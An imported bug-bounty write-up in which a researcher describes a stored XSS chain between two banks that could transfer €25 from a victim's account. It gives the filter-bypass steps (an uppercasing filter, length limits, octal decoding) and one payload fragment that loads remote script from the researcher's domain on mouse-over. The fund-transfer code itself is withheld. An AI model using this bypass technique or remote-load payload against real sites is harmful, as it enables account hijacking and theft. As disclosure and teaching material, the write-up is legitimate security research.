---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-06-28_how-i-hacked-a-bank-their-application-using-it-for-hacking-another-bank-company-.md
original_filename: 2020-06-28_how-i-hacked-a-bank-their-application-using-it-for-hacking-another-bank-company-.md
title: How I hacked a bank their application using it for hacking another bank company
  — 10K XSS
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
language: en
raw_sha256: 857f985dffa5cc6b15cdc2edd08143098ba92c509c89a76d66f97d7a1a29ff77
text_sha256: c1fbd569e69e5984da8d09939045b3371c62e757697c3c2126ba973e35ca2b36
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# How I hacked a bank their application using it for hacking another bank company — 10K XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-06-28_how-i-hacked-a-bank-their-application-using-it-for-hacking-another-bank-company-.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `857f985dffa5cc6b15cdc2edd08143098ba92c509c89a76d66f97d7a1a29ff77`
- Text SHA256: `c1fbd569e69e5984da8d09939045b3371c62e757697c3c2126ba973e35ca2b36`


## Content

---
title: "How I hacked a bank their application using it for hacking another bank company — 10K XSS"
url: "https://medium.com/@hgreal/how-i-hacked-a-bank-their-application-using-it-for-hacking-another-bank-company-10-k-xss-b9cc801a675"
authors: ["hg_real (@hgreal1)"]
bugs: ["XSS"]
bounty: "10,000"
publication_date: "2020-06-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4465
scraped_via: "browseros"
---

# How I hacked a bank their application using it for hacking another bank company — 10K XSS

How I hacked a bank their application using it for hacking another bank company — 10K XSS
hg_real
Follow
4 min read
·
Jun 29, 2020

186

People often ask me when I would do a write-up of one of my submissions,
In most cases I’m not allowed because they are too specific and even when I do redact the company their name it could still cause damage towards the company itself, well so here is my first one and hopefully more to come!

Press enter or click to view image in full size

I was a QA automation engineer for about 2 Years and got my first bounty by accident at Deliveroo, i submitted it as low and got the max payout 2.5K

This immediately triggered something within me: “Could I do more of this?”
And it did, I tried submitting bugs at the bug bounty platform Intigriti and after noob submissions i was awarded the “Researcher of the week”.

I couldn’t believe it that people actually do like my findings, but i needed to step up my game and I tried hacking some next level companies without luck. so I took a break of about 2 months. I didn’t enjoy my work anymore and I tried to pick up the bug bounty scene again because it was actually fun.

The people at Intigriti said: “welcome back and perhaps you can look into this program <redacted>, we really need a big submission at this bank? ”

My initial feeling until 5 days later i was about giving up bug bounty again for always…

… 5 Days have been passed without a submission, i was on the edge of having a mental breakdown because I did not want to go back doing this QA Job :(

Wait a minute, what If could abuse a bank that could send XSS to another bank which loads the XSS and when a victim logs into the bank which got the XSS their funds will be transfered to the attackers bank account?

seems like this scenario would work because I knew a bank that allowed XSS but they could not send XSS towards their own, and I knew also a bank that could send XSS but the XSS could not be exploited on their own website.

Get hg_real’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I immediately tried sending a small XSS payload towards the other bank and
BINGO, javascript was being executed! but it didn’t pop up the alert I sent?

Press enter or click to view image in full size
upper case alert… but i knew it could be possible, so no giving up until i tried every edge case!

another 5 days have been passed and I was really close to popping this XSS
some notes of my research so far:

the XSS payload received could only be 140 characters maximum length
it uppercases everything, also the <SCRIPT> tag
breaks the payload every 38 characters with a <BR>tag concatenated
the characters + and { and } are escaped
so the payload would be replacing the O characters

my first payload was sending an external CSS file, no big issue over here

Press enter or click to view image in full size

the single quotes will encapsulate the <BR> tag into the Z attribute
But now I encountered a big encoding decoding issue

Press enter or click to view image in full size
Wait a minute, what is this lower cased “load” doing here

so what the heck is going on here ?

you can’t execute upper cased javascript as the lower cased version would do
so apparently their is something that is called octal formatting which used to happen on the bank their part which translated \ddd to their octal decoded format. i stored ‘load’ into the G variable and replaced with jQuery the HEAD

$(‘HEAD’)[“load”](“//HGREAL.be”) executed when you did a mouse-over

Now why would anybody mouse-over something that looks phishy, well because the whole page was injected with the previous CSS payload i sent so whenever you moved your cursor the payload would execute :-)

The evil javascript that has been executed will not be shown in this Medium post because that will leak the company their name

but it was a chain that sent €25 towards the attacker because when you go past this €25 you need to enter a pin code ¯\_(ツ)_/¯

I submitted my finding and was awarded a 10K bounty with my first XSS
A few months later I quit my job and became a full time bug bounty hunter

I hope you enjoyed this write-up and happy hunting !
